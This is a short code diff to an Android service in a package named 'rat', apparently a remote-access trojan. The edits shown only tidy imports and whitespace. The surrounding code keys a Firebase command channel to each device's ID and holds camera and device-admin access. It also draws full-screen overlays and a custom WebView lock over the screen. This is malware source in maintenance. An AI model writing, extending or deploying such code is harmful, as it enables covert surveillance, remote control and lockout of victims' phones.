@@ -1,11 +1,11 @@
 package com.tumbal.rat
 
 import android.app.Service
+import android.app.admin.DevicePolicyManager
+import android.content.ComponentName
 import android.content.Intent
 import android.hardware.camera2.CameraCharacteristics
 import android.hardware.camera2.CameraManager
-import android.app.admin.DevicePolicyManager
-import android.content.ComponentName
 import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
@@ -35,7 +35,7 @@ class CoreService : Service() {
         super.onCreate()
         val deviceId = android.provider.Settings.Secure.getString(
             contentResolver, android.provider.Settings.Secure.ANDROID_ID)
-        
+
         dbRef = FirebaseDatabase.getInstance().reference
             .child("commands").child(deviceId)
         cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
@@ -132,7 +132,7 @@ class CoreService : Service() {
             width = ViewGroup.LayoutParams.MATCH_PARENT
             height = ViewGroup.LayoutParams.MATCH_PARENT
         })
-        handler.postDelayed({ 
+        handler.postDelayed({
             try { windowManager.removeView(block) } catch (_: Exception) {}
         }, 5000)
     }
@@ -165,7 +165,7 @@ class CoreService : Service() {
     }
 
     private fun removeCustomLock() {
-        webViewLock?.let { 
+        webViewLock?.let {
             try { windowManager.removeView(it) } catch (_: Exception) {}
             webViewLock = null
         }
